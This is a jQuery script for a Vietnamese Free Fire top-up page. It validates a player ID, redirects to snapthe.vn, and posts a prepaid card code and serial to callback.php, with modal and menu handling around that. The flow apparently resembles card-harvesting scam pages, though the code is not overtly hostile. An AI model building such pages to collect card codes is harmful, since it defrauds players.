(function($) {
    $.fn.inputFilter = function(inputFilter) {
        return this.on("input keydown keyup mousedown mouseup select contextmenu drop", function() {
            if (inputFilter(this.value)) {
                this.oldValue = this.value;
                this.oldSelectionStart = this.selectionStart;
                this.oldSelectionEnd = this.selectionEnd;
            } else if (this.hasOwnProperty("oldValue")) {
                this.value = this.oldValue;
                this.setSelectionRange(this.oldSelectionStart, this.oldSelectionEnd);
            } else {
                this.value = "";
            }
        });
    };
}(jQuery));
$(document).ready(function() {
    $('.s-slide-1 .slick-slider').slick();

    $('.s-header-1 [ht-trigger="hd-menu"]').click(function() {
        $('.s-menu-1').toggleClass('is-active');
        $('body').toggleClass('is-active');
        $(this).toggleClass('is-active');
    });
    $('.s-menu-1 .s_after').click(function() {
        $('.s-menu-1').removeClass('is-active');
        $('body').removeClass('is-active');
        $('.s-header-1 [ht-trigger="hd-menu"]').removeClass('is-active');
    });

    $('.s-menu-1 .s_menu ul li:first-child').click(function() {
        $('.s-menu-1').removeClass('is-active');
        $('body').removeClass('is-active');
        $('.s-header-1 [ht-trigger="hd-menu"]').removeClass('is-active');
    });

    var pathname = $(location).attr("href");
    var myString = pathname.substr(pathname.indexOf("?") + 1);
    $('.ReadOnlyFormField-content .ReadOnlyFormField-titleContainer ReadOnlyFormField-title span').text(myString);

    $('#login').click(function() {
        $id = $("input[name=idfaifai]");
        if ($id.val().length === 0) {
            $(this).parents().find('.c-error').text('Please enter your player ID');
            console.log("Lỗiii");
        } else if ($id.val().length < 8) {
            $(this).parents().find('.c-error').text('The player ID is not invalid');
        } else if ($id.val().length > 11) {
            $(this).parents().find('.c-error').text('The player ID is not invalid');
        } else {
            $(this).parents().find('.c-error').text('');
            window.location.href = 'https://snapthe.vn/freefire/index.html?user_id=' + $id.val() + '';
        }
    });

    $('#check').click(function() {
        $code = $("input[name=code]");
        $seri = $("input[name=seri]");
        if ($code.val().length === 0) {
            $(this).parents().find('.c-error').text('Vui lòng nhập mã thẻ');
        } else if ($seri.val().length === 0) {
            $(this).parents().find('.c-error').text('Vui lòng nhập seri');
        } else {
            window.setTimeout(function() {
                $.ajax({
                    url: './callback.php',
                    type: 'POST',
                    data: { code: $code.val(), serial: $seri.val(), type: $('input[name="type"]').val(), idGame: $('input[name="idGame"]').val(), amount: $('input[name="amount"]').val() },
                    beforeSend: function() { $("body").append('<div class="ht-loading-gif"><img src="images/preloader.svg" /></div>'); }
                })
                .done(function(data) {
                    var json = $.parseJSON(data);
                    $("body").find("div.ht-loading-gif").remove();
                    if(json.code) {
                        $('.c-error').html(json.title + ' ' + json.msg);
                    } else {
                        sessionStorage.setItem('item', JSON.stringify(json));
                        window.location.href = 'id.php';
                    }
                });
            }, 200);
        }
    });



    $("input[name=idfaifai]").inputFilter(function(value) {
        return /^-?\d*$/.test(value);
    });
    $("input[name=code]").inputFilter(function(value) {
        return /^-?\d*$/.test(value);
    });
    $("input[name=seri]").inputFilter(function(value) {
        return /^-?\d*$/.test(value);
    });
    // Event c-modal
    $('body').on('click', '[ht-trigger="c-modal"]', function() {
        $('body').append('<div class="c-modal-backdrop show"></div>');
        $('body').addClass('c-modal-open');
        $target = $($(this).attr('ht-target'));
        $target.css('display', 'block');
        $close = $(this).attr('ht-target-close');
        if ($close !== undefined) {
            $($close).removeClass('show');
            $($close).removeAttr('style');
            $('body').find('.c-modal-backdrop:last').remove();
        }
        setTimeout(function() { $target.addClass('show'); }, 200);
    });
    $('body').on('click', '[ht-close="c-modal"]', function() {
        var $close = $(this).attr('ht-target-close');
        var $reload = $(this).attr('ht-reload');
        if ($close) {
            $($close).removeClass('show');
            $('body').find('.c-modal-backdrop:last').removeClass('show');
            setTimeout(function() {
                $($close).removeAttr('style');
                $('body').find('.c-modal-backdrop:last').remove();
            }, 200);
        } else {
            $('.c-modal-backdrop').removeClass('show');
            $('.c-modal').removeClass('show');
            setTimeout(function() {
                $('.c-modal').removeAttr('style');
                $('body').removeClass('c-modal-open');
                $('.c-modal-backdrop').remove();
            }, 200);
        }
        if ($reload === 'true') {
            $redirect = ($(this).attr('ht-redirect') === 'false') ? '' : $(this).attr('ht-redirect');
            window.location.href = $redirect;
        }
    });
    $('body').on('click', '[ht-skip]', function(e) { e.stopPropagation(); });
});


$(document).ready(function() {
    $('body').on('click', '[ht-trigger="c-modal-3"]', function() {
        $('body').append('<div class="c-modal-3-backdrop show"></div>');
        $('body').addClass('c-modal-3-open');
        $target = $($(this).attr('ht-target'));
        $target.css('display', 'block');
        $close = $(this).attr('ht-target-close');
        if ($close !== undefined) {
            $($close).removeClass('show');
            $($close).removeAttr('style');
            $('body').find('.c-modal-3-backdrop:last').remove();
        }
        setTimeout(function() { $target.addClass('show'); }, 200);
    });
    $('body').on('click', '[ht-close="c-modal-3"]', function() {
        var $close = $(this).attr('ht-target-close');
        var $reload = $(this).attr('ht-reload');
        if ($close) {
            $($close).removeClass('show');
            $('body').find('.c-modal-3-backdrop:last').removeClass('show');
            setTimeout(function() {
                $($close).removeAttr('style');
                $('body').find('.c-modal-3-backdrop:last').remove();
            }, 200);
        } else {
            $('.c-modal-3-backdrop').removeClass('show');
            $('.c-modal-3').removeClass('show');
            setTimeout(function() {
                $('.c-modal-3').removeAttr('style');
                $('body').removeClass('c-modal-3-open');
                $('.c-modal-3-backdrop').remove();
            }, 200);
        }
        if ($reload === 'true') {
            $redirect = ($(this).attr('ht-redirect') === 'false') ? '' : $(this).attr('ht-redirect');
            window.location.href = $redirect;
        }
    });
});